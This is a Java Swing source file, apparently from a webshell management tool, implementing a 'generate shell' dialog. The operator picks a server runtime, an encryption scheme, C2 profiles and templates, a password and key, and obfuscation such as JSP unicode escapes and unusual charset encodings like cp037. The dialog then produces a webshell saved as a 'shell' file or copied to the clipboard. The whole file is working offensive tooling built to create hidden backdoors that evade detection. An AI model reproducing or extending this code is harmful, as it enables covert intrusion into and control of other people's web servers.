package core.ui.component.dialog;

import core.ApplicationContext;
import core.EasyI18N;
import core.annotation.GenerateProcessor;
import core.annotation.PropertyAnnotation;
import core.c2profile.C2ProfileContext;
import core.c2profile.C2ProfileLoader;
import core.c2profile.c2annotation.C2ProfileTemplate;
import core.c2profile.cryption.C2Channel;
import core.imp.Cryption;
import core.shellprocessor.StartProcessor;
import core.shellprocessor.jspescapes.JspEscapesProcessor;
import core.ui.MainActivity;
import core.ui.component.RTextArea;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import java.awt.Toolkit;
import java.awt.datatransfer.StringSelection;
import java.awt.event.ActionEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JComponent;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.border.EmptyBorder;
import org.fife.ui.rtextarea.RTextScrollPane;
import util.Log;
import util.automaticBindClick;
import util.functions;

/**
 * Generate webshell dialog. Layout matches the dropdown form:
 * runtime / type / algorithm, pass+key+suffix, obfuscation/encoding, preview.
 * Backed by existing ApplicationContext payloads and Cryption.generate().
 */
public class GenerateShellLoder extends JDialog {
    private static final String PLACEHOLDER = "\u751f\u6210\u7ed3\u679c\u5c06\u663e\u793a\u5728\u8fd9\u91cc";
    private static final String NONE = "\u5173\u95ed";
    private static final String ON = "\u5f00\u542f";
    private static final String[] JSP_ENCODINGS = new String[]{
            "\u5173\u95ed", "cp037", "cp290", "utf-16le", "utf-16be", "utf-32le", "utf-32be", "IBM01145", "IBM01146"
    };

    private final JComboBox<NamedItem> runtimeComboBox;
    private final JComboBox<NamedItem> algorithmComboBox;
    private final JTextField passwordTextField;
    private final JTextField secretKeyTextField;
    private final JButton randomPassButton;
    private final JButton randomKeyButton;
    private final JComboBox<String> suffixComboBox;
    private final JComboBox<NamedItem> obfuscationComboBox;
    private final JComboBox<NamedItem> escapeMethodComboBox;
    private final JComboBox<NamedItem> encodingComboBox;
    private final JComboBox<String> c2ProfileComboBox;
    private final JComboBox<NamedItem> c2TemplateComboBox;
    private final JComboBox<String> doubleConfusionComboBox;
    private final JComboBox<String> randomConfusionComboBox;
    private final JButton saveToFileButton;
    private final JButton copyToClipboardButton;
    private final JButton generateButton;
    private final RTextArea previewArea;

    private boolean refreshing;
    private byte[] lastBytes;
    private String lastPreview;

    public GenerateShellLoder() {
        super(MainActivity.getFrame(), "\u751f\u6210", true);
        this.runtimeComboBox = new JComboBox<NamedItem>();
        this.algorithmComboBox = new JComboBox<NamedItem>();
        this.passwordTextField = new JTextField("pass");
        this.secretKeyTextField = new JTextField("key");
        this.randomPassButton = new JButton("\u968f\u673a");
        this.randomKeyButton = new JButton("\u968f\u673a");
        this.suffixComboBox = new JComboBox<String>();
        this.obfuscationComboBox = new JComboBox<NamedItem>();
        this.escapeMethodComboBox = new JComboBox<NamedItem>();
        this.encodingComboBox = new JComboBox<NamedItem>();
        this.c2ProfileComboBox = new JComboBox<String>();
        this.c2TemplateComboBox = new JComboBox<NamedItem>();
        this.doubleConfusionComboBox = new JComboBox<String>(new String[]{NONE, ON});
        this.randomConfusionComboBox = new JComboBox<String>(new String[]{NONE, ON});
        this.saveToFileButton = new JButton("\u4fdd\u5b58\u5230\u6587\u4ef6");
        this.copyToClipboardButton = new JButton("\u590d\u5236\u5230\u526a\u5207\u677f");
        this.generateButton = new JButton("\u751f\u6210");
        this.previewArea = new RTextArea();
        this.prepareCombos(this.runtimeComboBox, this.algorithmComboBox, this.suffixComboBox,
                this.obfuscationComboBox, this.escapeMethodComboBox, this.encodingComboBox,
                this.c2ProfileComboBox, this.c2TemplateComboBox,
                this.doubleConfusionComboBox, this.randomConfusionComboBox);
        this.buildUi();
        this.bindEvents();
        automaticBindClick.bindJButtonClick(this, this);
        this.loadRuntimes();
        functions.setWindowSize(this, 960, 700);
        this.setMinimumSize(new Dimension(820, 560));
        this.setLocationRelativeTo(MainActivity.getFrame());
        this.setDefaultCloseOperation(2);
        this.getRootPane().setDefaultButton(this.generateButton);
        EasyI18N.installObject(this);
        this.setVisible(true);
    }

    private void buildUi() {
        JPanel root = new JPanel(new BorderLayout(0, 12));
        root.setBorder(new EmptyBorder(16, 18, 16, 18));

        JPanel form = new JPanel(new GridLayout(4, 3, 12, 10));
        form.add(labeled("\u8fd0\u884c\u65f6", this.runtimeComboBox));
        form.add(labeled("\u7b97\u6cd5", this.algorithmComboBox));
        form.add(labeled("\u540e\u7f00", this.suffixComboBox));
        form.add(labeled("Pass", withRandom(this.passwordTextField, this.randomPassButton)));
        form.add(labeled("Key", withRandom(this.secretKeyTextField, this.randomKeyButton)));
        form.add(labeled("C2\u6a21\u677f", this.c2TemplateComboBox));
        form.add(labeled("\u6df7\u6dc6", this.obfuscationComboBox));
        form.add(labeled("\u6df7\u6dc6\u65b9\u5f0f", this.escapeMethodComboBox));
        form.add(labeled("\u7f16\u7801", this.encodingComboBox));
        form.add(labeled("Profile", this.c2ProfileComboBox));
        form.add(labeled("\u53cc\u91cd\u6df7\u6dc6", this.doubleConfusionComboBox));
        form.add(labeled("\u968f\u673a\u6df7\u6dc6", this.randomConfusionComboBox));

        JPanel buttons = new JPanel(new FlowLayout(FlowLayout.CENTER, 12, 4));
        buttons.add(this.saveToFileButton);
        buttons.add(this.copyToClipboardButton);
        buttons.add(this.generateButton);

        JPanel top = new JPanel(new BorderLayout(0, 10));
        top.add(form, BorderLayout.CENTER);
        top.add(buttons, BorderLayout.SOUTH);

        this.previewArea.setText(PLACEHOLDER);
        this.previewArea.setEditable(true);
        RTextScrollPane scroll = new RTextScrollPane(this.previewArea, true);
        scroll.setLineNumbersEnabled(true);

        root.add(top, BorderLayout.NORTH);
        root.add(scroll, BorderLayout.CENTER);
        this.setContentPane(root);
    }

    private static void prepareCombos(JComboBox... combos) {
        for (JComboBox combo : combos) {
            combo.setMaximumRowCount(16);
            combo.setPreferredSize(new Dimension(10, 28));
        }
    }

    private static JPanel labeled(String title, JComponent field) {
        JPanel panel = new JPanel(new BorderLayout(0, 4));
        panel.add(new JLabel(title), BorderLayout.NORTH);
        panel.add(field, BorderLayout.CENTER);
        return panel;
    }

    private static JPanel withRandom(JTextField field, JButton random) {
        JPanel panel = new JPanel(new BorderLayout(6, 0));
        panel.add(field, BorderLayout.CENTER);
        panel.add(random, BorderLayout.EAST);
        return panel;
    }

    private void bindEvents() {
        this.runtimeComboBox.addActionListener((e) -> {
            if (!this.refreshing) {
                this.refreshAlgorithms();
            }
        });
        this.algorithmComboBox.addActionListener((e) -> {
            if (!this.refreshing) {
                this.refreshSuffixAndProcessors();
            }
        });
        this.c2TemplateComboBox.addActionListener((e) -> {
            if (!this.refreshing) {
                this.refreshC2SuffixOnly();
            }
        });
        this.suffixComboBox.addActionListener((e) -> {
            if (!this.refreshing) {
                this.refreshProcessorsOnly();
            }
        });
        this.obfuscationComboBox.addActionListener((e) -> {
            if (!this.refreshing) {
                this.refreshEscapeOptionsState();
            }
        });
        this.randomConfusionComboBox.addActionListener((e) -> {
            if (!this.refreshing) {
                this.refreshEscapeOptionsState();
            }
        });
    }

    private void loadRuntimes() {
        this.refreshing = true;
        this.runtimeComboBox.removeAllItems();
        String[] payloads = ApplicationContext.getAllPayload();
        if (payloads != null) {
            List<NamedItem> items = new ArrayList<NamedItem>();
            for (String payload : payloads) {
                if (payload != null && payload.trim().length() > 0) {
                    items.add(new NamedItem(runtimeDisplay(payload), payload));
                }
            }
            items.sort((a, b) -> Integer.compare(runtimeRank(a.value), runtimeRank(b.value)));
            for (NamedItem item : items) {
                this.runtimeComboBox.addItem(item);
            }
            selectRuntime("JavaDynamicPayload");
        }
        this.refreshing = false;
        this.refreshAlgorithms();
    }

    private void refreshAlgorithms() {
        this.refreshing = true;
        String payload = this.selectedPayload();
        this.algorithmComboBox.removeAllItems();
        if (payload != null) {
            List<NamedItem> items = new ArrayList<NamedItem>();
            for (String cryption : safeCryptions(payload)) {
                items.add(new NamedItem(algoDisplay(cryption), cryption));
            }
            items.sort((a, b) -> Integer.compare(algoRank(a.value), algoRank(b.value)));
            for (NamedItem item : items) {
                this.algorithmComboBox.addItem(item);
            }
            int prefer = this.indexOfAlgoContains("XOR_IMAGE");
            if (prefer >= 0) {
                this.algorithmComboBox.setSelectedIndex(prefer);
            } else if (this.algorithmComboBox.getItemCount() > 0) {
                this.algorithmComboBox.setSelectedIndex(0);
            }
        }
        this.refreshing = false;
        this.refreshSuffixAndProcessors();
    }

    private void refreshSuffixAndProcessors() {
        this.refreshing = true;
        String payload = this.selectedPayload();
        String cryptionName = this.selectedCryption();
        Cryption cryption = payload != null && cryptionName != null
                ? ApplicationContext.getCryption(payload, cryptionName) : null;
        this.refreshC2Profiles(payload, cryption);
        this.refreshC2Templates(payload, cryption);
        this.fillSuffixChoices(cryption);
        this.refreshing = false;
        this.refreshProcessorsOnly();
    }

    private void refreshC2SuffixOnly() {
        this.refreshing = true;
        String payload = this.selectedPayload();
        String cryptionName = this.selectedCryption();
        Cryption cryption = payload != null && cryptionName != null
                ? ApplicationContext.getCryption(payload, cryptionName) : null;
        this.fillSuffixChoices(cryption);
        this.refreshing = false;
        this.refreshProcessorsOnly();
    }

    private void fillSuffixChoices(Cryption cryption) {
        this.suffixComboBox.removeAllItems();
        List<String> suffixes = cryption instanceof C2Channel
                ? readC2SupportTypes() : readSuffixChoices(cryption);
        for (String suffix : suffixes) {
            this.suffixComboBox.addItem(displaySuffix(suffix));
        }
        if (this.suffixComboBox.getItemCount() > 0) {
            this.suffixComboBox.setSelectedIndex(0);
        }
    }

    private void refreshC2Profiles(String payload, Cryption cryption) {
        this.c2ProfileComboBox.removeAllItems();
        boolean c2 = cryption instanceof C2Channel;
        this.c2ProfileComboBox.setEnabled(c2);
        if (c2 && payload != null) {
            String[] profiles = ApplicationContext.listC2Profile(payload);
            if (profiles != null) {
                for (String profile : profiles) {
                    if (profile != null && profile.trim().length() > 0) {
                        this.c2ProfileComboBox.addItem(profile);
                    }
                }
            }
        }
    }

    private void refreshC2Templates(String payload, Cryption cryption) {
        this.c2TemplateComboBox.removeAllItems();
        boolean c2 = cryption instanceof C2Channel;
        this.c2TemplateComboBox.setEnabled(c2);
        if (!c2 || payload == null) {
            return;
        }
        LinkedList<Class> templates = C2ProfileContext.listC2ProfileTemplate(payload);
        if (templates == null) {
            return;
        }
        for (Class clazz : templates) {
            C2ProfileTemplate annotation = (C2ProfileTemplate) clazz.getAnnotation(C2ProfileTemplate.class);
            if (annotation != null && annotation.templateName() != null) {
                this.c2TemplateComboBox.addItem(new NamedItem(annotation.templateName(), annotation.templateName()));
            }
        }
        if (this.c2TemplateComboBox.getItemCount() > 0) {
            this.c2TemplateComboBox.setSelectedIndex(0);
        }
    }

    private void refreshProcessorsOnly() {
        this.refreshing = true;
        this.obfuscationComboBox.removeAllItems();
        this.escapeMethodComboBox.removeAllItems();
        this.encodingComboBox.removeAllItems();
        this.obfuscationComboBox.addItem(new NamedItem(NONE, "none"));
        this.escapeMethodComboBox.addItem(new NamedItem("\u968f\u673a", "random"));
        this.encodingComboBox.addItem(new NamedItem(NONE, "none"));
        String suffix = this.selectedSuffix();
        LinkedHashSet<Class> classes = collectProcessors(suffix);
        for (Class clazz : classes) {
            String display = processorDisplay(clazz);
            String simple = clazz.getSimpleName();
            if (isNoneProcessor(display, simple)) {
                continue;
            }
            NamedItem item = new NamedItem(display, simple);
            if (isEncodingProcessor(display, simple)) {
                this.encodingComboBox.addItem(item);
            }
            this.obfuscationComboBox.addItem(item);
        }
        if (isJspFamily(suffix)) {
            try {
                String[] methods = JspEscapesProcessor.listEscapeMethods();
                if (methods != null) {
                    for (String method : methods) {
                        this.escapeMethodComboBox.addItem(new NamedItem(method, method));
                    }
                }
            } catch (Throwable ignored) {
            }
            for (String encoding : JSP_ENCODINGS) {
                if (!NONE.equals(encoding)) {
                    this.encodingComboBox.addItem(new NamedItem(encoding, encoding));
                }
            }
        }
        this.obfuscationComboBox.setSelectedIndex(0);
        this.escapeMethodComboBox.setSelectedIndex(0);
        this.encodingComboBox.setSelectedIndex(0);
        this.doubleConfusionComboBox.setSelectedItem(NONE);
        this.randomConfusionComboBox.setSelectedItem(NONE);
        this.refreshing = false;
        this.refreshEscapeOptionsState();
    }

    private void refreshEscapeOptionsState() {
        boolean jspEscape = isJspEscapeSelected();
        boolean random = ON.equals(String.valueOf(this.randomConfusionComboBox.getSelectedItem()));
        this.escapeMethodComboBox.setEnabled(jspEscape && !random);
        this.doubleConfusionComboBox.setEnabled(jspEscape);
        this.randomConfusionComboBox.setEnabled(jspEscape);
    }

    private void randomPassButtonClick(ActionEvent e) {
        this.passwordTextField.setText(functions.getRandomString(8));
    }

    private void randomKeyButtonClick(ActionEvent e) {
        this.secretKeyTextField.setText(randomHex(16));
    }

    private void generateButtonClick(ActionEvent e) {
        try {
            String pass = textOf(this.passwordTextField);
            String key = textOf(this.secretKeyTextField);
            String payload = this.selectedPayload();
            String cryptionName = this.selectedCryption();
            if (pass.isEmpty() || key.isEmpty()) {
                GOptionPane.showMessageDialog(this, "password \u6216 secretKey  \u662f\u7a7a\u7684!", "\u63d0\u793a", 2);
                return;
            }
            if (payload == null || cryptionName == null) {
                GOptionPane.showMessageDialog(this, "payload \u6216  cryption \u6ca1\u6709\u9009\u4e2d!", "\u63d0\u793a", 2);
                return;
            }
            Cryption cryption = ApplicationContext.getCryption(payload, cryptionName);
            if (cryption == null) {
                GOptionPane.showMessageDialog(this, "\u65e0\u6cd5\u52a0\u8f7d\u52a0\u5bc6\u5668", "\u63d0\u793a", 2);
                return;
            }
            applySuffix(cryption, this.selectedSuffix());
            String obfuscation = selectedValue(this.obfuscationComboBox);
            String encoding = selectedValue(this.encodingComboBox);
            this.applyJspEscapeAutoOptions(obfuscation, encoding);
            String processName = obfuscation == null ? "none" : obfuscation;
            if (isCharsetEncoding(encoding) && !isJspEscapeSelected()) {
                processName = "none";
            }
            StartProcessor.setAutoProcessor(processName);
            byte[] data;
            try {
                if (cryption instanceof C2Channel) {
                    String profileName = (String) this.c2ProfileComboBox.getSelectedItem();
                    String templateName = selectedValue(this.c2TemplateComboBox);
                    String templateType = this.selectedSuffix();
                    if (profileName == null || profileName.trim().length() == 0) {
                        throw new IllegalArgumentException("\u672a\u9009\u4e2dC2Profile");
                    }
                    if (templateName == null || "none".equals(templateName) || templateType == null) {
                        throw new IllegalArgumentException("\u672a\u9009\u4e2dC2\u6a21\u677f");
                    }
                    GOptionPane.pushAutoSelection(templateName);
                    GOptionPane.pushAutoSelection(templateType);
                    GOptionPane.setSkipPropertyDialog(true);
                    data = ((C2Channel) cryption).generate(pass, key,
                            C2ProfileLoader.loadC2Profile(ApplicationContext.getC2Profile(profileName)).getC2ProfileContext());
                } else {
                    data = cryption.generate(pass, key);
                }
            } finally {
                StartProcessor.clearAutoProcessor();
                JspEscapesProcessor.clearAutoOptions();
                GOptionPane.clearAutoSelection();
            }
            if (data != null && encoding != null && !"none".equalsIgnoreCase(encoding) && !isCharsetEncoding(encoding)) {
                StartProcessor.setAutoProcessor(encoding);
                try {
                    data = StartProcessor.process(data, this.selectedSuffix());
                } finally {
                    StartProcessor.clearAutoProcessor();
                }
            }
            if (data == null || data.length == 0) {
                GOptionPane.showMessageDialog(this, "\u52a0\u5bc6\u5668\u5728\u751f\u6210\u65f6\u8fd4\u56de\u7a7a", "\u63d0\u793a", 2);
                return;
            }
            this.lastBytes = data;
            this.lastPreview = toPreview(data);
            this.previewArea.setText(this.lastPreview);
            this.previewArea.setCaretPosition(0);
        } catch (Exception ex) {
            Log.error(ex);
            GOptionPane.showMessageDialog(this, ex.getMessage(), "\u63d0\u793a", 2);
        }
    }

    private void saveToFileButtonClick(ActionEvent e) {
        byte[] data = this.bytesToSave();
        if (data == null) {
            GOptionPane.showMessageDialog(this, "\u8bf7\u5148\u751f\u6210", "\u63d0\u793a", 2);
            return;
        }
        try {
            GFileChooser chooser = new GFileChooser();
            String suffix = this.selectedSuffix();
            if (suffix != null && suffix.length() > 0) {
                chooser.setSelectedFile("shell." + suffix);
            } else {
                chooser.setSelectedFile("shell.txt");
            }
            File file = chooser.showSaveDialog(this);
            if (file == null) {
                Log.log("\u7528\u6237\u53d6\u6d88\u9009\u62e9....");
                return;
            }
            FileOutputStream out = new FileOutputStream(file);
            out.write(data);
            out.close();
            GOptionPane.showMessageDialog(this, "success! save file to ->" + file.getAbsolutePath(), "\u63d0\u793a", 1);
        } catch (Exception ex) {
            Log.error(ex);
            GOptionPane.showMessageDialog(this, ex.getMessage(), "\u63d0\u793a", 2);
        }
    }

    private void copyToClipboardButtonClick(ActionEvent e) {
        String text = this.previewArea.getText();
        if (text == null || text.length() == 0 || PLACEHOLDER.equals(text)) {
            GOptionPane.showMessageDialog(this, "\u8bf7\u5148\u751f\u6210", "\u63d0\u793a", 2);
            return;
        }
        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(text), null);
        GOptionPane.showMessageDialog(this, "\u5df2\u590d\u5236\u5230\u526a\u5207\u677f", "\u63d0\u793a", 1);
    }

    private byte[] bytesToSave() {
        String text = this.previewArea.getText();
        if (this.lastBytes == null || text == null || PLACEHOLDER.equals(text)) {
            return null;
        }
        if (this.lastPreview != null && !this.lastPreview.equals(text)) {
            try {
                return text.getBytes("UTF-8");
            } catch (Exception ex) {
                return text.getBytes();
            }
        }
        return this.lastBytes;
    }

    private String selectedPayload() {
        NamedItem item = (NamedItem) this.runtimeComboBox.getSelectedItem();
        return item == null ? null : item.value;
    }

    private String selectedCryption() {
        NamedItem item = (NamedItem) this.algorithmComboBox.getSelectedItem();
        return item == null ? null : item.value;
    }

    private String selectedSuffix() {
        Object selected = this.suffixComboBox.getSelectedItem();
        if (selected == null) {
            return null;
        }
        String suffix = selected.toString().trim();
        if (suffix.startsWith(".")) {
            suffix = suffix.substring(1);
        }
        return suffix.length() == 0 ? null : suffix;
    }

    private static String selectedValue(JComboBox<NamedItem> combo) {
        NamedItem item = (NamedItem) combo.getSelectedItem();
        return item == null ? "none" : item.value;
    }

    private void selectRuntime(String payload) {
        for (int i = 0; i < this.runtimeComboBox.getItemCount(); ++i) {
            if (payload.equals(this.runtimeComboBox.getItemAt(i).value)) {
                this.runtimeComboBox.setSelectedIndex(i);
                return;
            }
        }
        if (this.runtimeComboBox.getItemCount() > 0) {
            this.runtimeComboBox.setSelectedIndex(0);
        }
    }

    private int indexOf(JComboBox<String> combo, String value) {
        for (int i = 0; i < combo.getItemCount(); ++i) {
            if (value.equals(combo.getItemAt(i))) {
                return i;
            }
        }
        return -1;
    }

    private int indexOfAlgoContains(String token) {
        for (int i = 0; i < this.algorithmComboBox.getItemCount(); ++i) {
            if (this.algorithmComboBox.getItemAt(i).value.toUpperCase().contains(token)) {
                return i;
            }
        }
        return -1;
    }

    private static String[] safeCryptions(String payload) {
        String[] all = ApplicationContext.getAllCryption(payload);
        return all == null ? new String[0] : all;
    }

    private List<String> readC2SupportTypes() {
        List<String> list = new ArrayList<String>();
        String payload = this.selectedPayload();
        String templateName = selectedValue(this.c2TemplateComboBox);
        if (payload == null || templateName == null || "none".equals(templateName)) {
            return list;
        }
        LinkedList<Class> templates = C2ProfileContext.listC2ProfileTemplate(payload);
        if (templates == null) {
            return list;
        }
        for (Class clazz : templates) {
            C2ProfileTemplate annotation = (C2ProfileTemplate) clazz.getAnnotation(C2ProfileTemplate.class);
            if (annotation != null && templateName.equals(annotation.templateName())) {
                String[] types = annotation.supportType();
                if (types != null) {
                    for (String type : types) {
                        String suffix = normalizeSuffix(type);
                        if (suffix != null && !list.contains(suffix)) {
                            list.add(suffix);
                        }
                    }
                }
                break;
            }
        }
        return list;
    }

    private static List<String> readSuffixChoices(Cryption cryption) {
        List<String> list = new ArrayList<String>();
        if (cryption == null) {
            return list;
        }
        try {
            Field[] fields = cryption.getClass().getDeclaredFields();
            for (Field field : fields) {
                PropertyAnnotation annotation = (PropertyAnnotation) field.getAnnotation(PropertyAnnotation.class);
                if (annotation != null && "suffix".equalsIgnoreCase(annotation.Name())) {
                    for (String part : annotation.Value().split(";")) {
                        String suffix = normalizeSuffix(part);
                        if (suffix != null && !list.contains(suffix)) {
                            list.add(suffix);
                        }
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        if (list.isEmpty()) {
            String suffix = normalizeSuffix(cryption.getSuffix());
            if (suffix != null) {
                list.add(suffix);
            }
        }
        if (list.isEmpty()) {
            list.add("txt");
        }
        return list;
    }

    private static void applySuffix(Cryption cryption, String suffix) {
        if (cryption == null || suffix == null) {
            return;
        }
        try {
            functions.setObjectProperty(cryption, "suffix", suffix);
        } catch (Throwable ignored) {
        }
    }

    private static String normalizeSuffix(String suffix) {
        if (suffix == null) {
            return null;
        }
        String value = suffix.trim();
        if (value.startsWith(".")) {
            value = value.substring(1);
        }
        return value.length() == 0 ? null : value;
    }

    private static String displaySuffix(String suffix) {
        return suffix.contains(".") ? suffix : "." + suffix;
    }

    public static String groupOf(String cryptionName) {
        String n = cryptionName.toUpperCase();
        if (n.contains("C2")) {
            return "C2";
        }
        if (n.contains("GZIP")) {
            return "Gzip";
        }
        if (n.contains("IMAGE")) {
            return "Mini";
        }
        if (n.contains("JNDI") || n.contains("CHUNK") || n.contains("WEBSOCKET")
                || n.contains("MSSQL") || n.contains("MYSQL") || n.contains("REDIS")
                || n.contains("POSTGRES") || n.contains("TCP")) {
            return "\u5176\u4ed6";
        }
        if (n.contains("AES")) {
            return "AES";
        }
        return "Mini";
    }

    public static String runtimeDisplay(String payload) {
        String name = payload;
        if (name.endsWith("DynamicPayload")) {
            name = name.substring(0, name.length() - "DynamicPayload".length());
        } else if (name.endsWith("Payload")) {
            name = name.substring(0, name.length() - "Payload".length());
        }
        if ("Php".equalsIgnoreCase(name)) {
            return "PHP";
        }
        if ("Asp".equalsIgnoreCase(name)) {
            return "ASP";
        }
        if ("Csharp".equalsIgnoreCase(name) || "CSharp".equals(name)) {
            return "CSharp";
        }
        if ("Netcore".equalsIgnoreCase(name)) {
            return "NetCore";
        }
        return name;
    }

    public static String algoDisplay(String cryptionName) {
        String u = cryptionName.toUpperCase();
        if (u.contains("XOR_IMAGE") || u.endsWith("_IMAGE") || u.contains("IMAGE")) {
            if (u.contains("ASMX")) {
                return "xor_png_asmx";
            }
            if (u.contains("SOAP")) {
                return "xor_png_soap";
            }
            return "xor_png";
        }
        String s = cryptionName;
        String[] prefixes = new String[]{"JAVA_", "CSHARP_", "PHP_", "ASP_", "NETCORE_", "ASMX_"};
        for (String prefix : prefixes) {
            if (s.toUpperCase().startsWith(prefix)) {
                s = s.substring(prefix.length());
                break;
            }
        }
        return toSnake(s);
    }

    private static String toSnake(String name) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < name.length(); ++i) {
            char c = name.charAt(i);
            if (c == '_' || c == '-' || c == ' ') {
                if (sb.length() > 0 && sb.charAt(sb.length() - 1) != '_') {
                    sb.append('_');
                }
            } else if (Character.isUpperCase(c) && i > 0 && Character.isLowerCase(name.charAt(i - 1))) {
                sb.append('_');
                sb.append(Character.toLowerCase(c));
            } else {
                sb.append(Character.toLowerCase(c));
            }
        }
        String out = sb.toString();
        while (out.contains("__")) {
            out = out.replace("__", "_");
        }
        if (out.startsWith("_")) {
            out = out.substring(1);
        }
        return out;
    }

    private static int runtimeRank(String payload) {
        String n = payload.toUpperCase();
        if (n.contains("JAVA") && !n.contains("JNDI")) {
            return 0;
        }
        if (n.contains("CSHARP")) {
            return 1;
        }
        if (n.contains("PHP")) {
            return 2;
        }
        if (n.contains("ASP") && !n.contains("ASPX")) {
            return 3;
        }
        if (n.contains("NETCORE")) {
            return 4;
        }
        return 10;
    }

    private static int algoRank(String cryption) {
        String n = cryption.toUpperCase();
        if (n.contains("XOR_IMAGE") && !n.contains("ASMX")) {
            return 0;
        }
        if (n.contains("XOR_IMAGE")) {
            return 1;
        }
        if (n.contains("AES_BASE64") && !n.contains("ASMX") && !n.contains("SOAP") && !n.contains("EVAL")) {
            return 2;
        }
        if (n.contains("GZIP")) {
            return 3;
        }
        return 10;
    }

    private static String processorDisplay(Class clazz) {
        try {
            GenerateProcessor gp = (GenerateProcessor) clazz.getAnnotation(GenerateProcessor.class);
            if (gp != null && gp.DisplayName() != null && gp.DisplayName().trim().length() > 0) {
                return gp.DisplayName();
            }
        } catch (Throwable ignored) {
        }
        return clazz.getSimpleName();
    }

    private LinkedHashSet<Class> collectProcessors(String suffix) {
        LinkedHashSet<Class> result = new LinkedHashSet<Class>();
        if (StartProcessor.processors == null) {
            return result;
        }
        for (Map.Entry<String, LinkedHashSet<Class>> entry : StartProcessor.processors.entrySet()) {
            if (sameProcessorFamily(suffix, entry.getKey()) && entry.getValue() != null) {
                result.addAll(entry.getValue());
            }
        }
        return result;
    }

    private static boolean sameProcessorFamily(String selected, String key) {
        if (selected == null || key == null) {
            return false;
        }
        if (selected.equalsIgnoreCase(key)) {
            return true;
        }
        return isJspFamily(selected) && isJspFamily(key)
                || isAspxFamily(selected) && isAspxFamily(key);
    }

    private static boolean isJspFamily(String suffix) {
        return suffix != null && ("jsp".equalsIgnoreCase(suffix) || "jspx".equalsIgnoreCase(suffix));
    }

    private static boolean isAspxFamily(String suffix) {
        if (suffix == null) {
            return false;
        }
        String s = suffix.toLowerCase();
        return "aspx".equals(s) || "ashx".equals(s) || "asmx".equals(s) || "soap".equals(s);
    }

    private boolean isJspEscapeSelected() {
        String value = selectedValue(this.obfuscationComboBox);
        return value != null && value.toLowerCase().contains("jspescapes");
    }

    private void applyJspEscapeAutoOptions(String obfuscation, String encoding) {
        if (obfuscation == null || !obfuscation.toLowerCase().contains("jspescapes")) {
            return;
        }
        JspEscapesProcessor.EscapesOptions options = new JspEscapesProcessor.EscapesOptions();
        String method = selectedValue(this.escapeMethodComboBox);
        boolean random = ON.equals(String.valueOf(this.randomConfusionComboBox.getSelectedItem()));
        options.isRandomConfusion = random;
        options.isDoubleConfusion = ON.equals(String.valueOf(this.doubleConfusionComboBox.getSelectedItem()));
        options.isAppendLitter = false;
        options.minLitterNumber = 2;
        options.maxLitterNumber = 5;
        options.isEncodingHeader = true;
        if (random) {
            options.escapeMethod = "escapesUnicode";
        } else if (method != null && !"none".equalsIgnoreCase(method) && !"random".equalsIgnoreCase(method)) {
            options.escapeMethod = method;
        } else {
            options.escapeMethod = "escapesUnicode";
            options.isRandomConfusion = true;
        }
        options.EncodingMethod = isCharsetEncoding(encoding) ? encoding : NONE;
        JspEscapesProcessor.setAutoOptions(options);
    }

    private static boolean isCharsetEncoding(String encoding) {
        if (encoding == null || "none".equalsIgnoreCase(encoding) || NONE.equals(encoding)) {
            return false;
        }
        for (String item : JSP_ENCODINGS) {
            if (item.equalsIgnoreCase(encoding)) {
                return true;
            }
        }
        String lower = encoding.toLowerCase();
        return lower.startsWith("cp") || lower.startsWith("ibm") || lower.startsWith("utf-");
    }

    private static boolean isNoneProcessor(String display, String simple) {
        String d = display == null ? "" : display.trim();
        String s = simple == null ? "" : simple.toLowerCase();
        return "\u65e0".equals(d) || "none".equalsIgnoreCase(d) || s.endsWith("none") || s.contains("none");
    }

    private static boolean isEncodingProcessor(String display, String simple) {
        String d = (display + " " + simple).toLowerCase();
        return d.contains("unicode") || d.contains("utf7") || d.contains("utf-7");
    }

    private static String toPreview(byte[] data) {
        if (looksBinary(data)) {
            return "[\u4e8c\u8fdb\u5236\u5185\u5bb9 " + data.length + " bytes\uff0c\u8bf7\u4f7f\u7528\u4fdd\u5b58\u5230\u6587\u4ef6]\n"
                    + hexPreview(data, 512);
        }
        try {
            return new String(data, "UTF-8");
        } catch (Exception ex) {
            return new String(data);
        }
    }

    private static boolean looksBinary(byte[] data) {
        int limit = Math.min(data.length, 2048);
        int bad = 0;
        for (int i = 0; i < limit; ++i) {
            int b = data[i] & 255;
            if (b == 9 || b == 10 || b == 13) {
                continue;
            }
            if (b < 32 || b == 127) {
                ++bad;
            }
        }
        return limit > 0 && bad * 10 > limit;
    }

    private static String hexPreview(byte[] data, int max) {
        StringBuilder sb = new StringBuilder();
        int n = Math.min(data.length, max);
        for (int i = 0; i < n; ++i) {
            sb.append(String.format("%02x", data[i] & 255));
            if ((i + 1) % 32 == 0) {
                sb.append('\n');
            }
        }
        if (data.length > max) {
            sb.append("\n...");
        }
        return sb.toString();
    }

    private static String textOf(JTextField field) {
        String text = field.getText();
        return text == null ? "" : text.trim();
    }

    private static String randomHex(int length) {
        Random random = new Random();
        StringBuilder sb = new StringBuilder(length);
        for (int i = 0; i < length; ++i) {
            sb.append("0123456789abcdef".charAt(random.nextInt(16)));
        }
        return sb.toString();
    }

    static Map<String, List<String>> describe(String payload) {
        LinkedHashMap<String, List<String>> map = new LinkedHashMap<String, List<String>>();
        for (String cryption : safeCryptions(payload)) {
            String type = groupOf(cryption);
            List<String> list = map.get(type);
            if (list == null) {
                list = new ArrayList<String>();
                map.put(type, list);
            }
            list.add(algoDisplay(cryption) + "=" + cryption);
        }
        return map;
    }

    static final class NamedItem {
        final String display;
        final String value;

        NamedItem(String display, String value) {
            this.display = display;
            this.value = value;
        }

        public String toString() {
            return this.display;
        }
    }
}
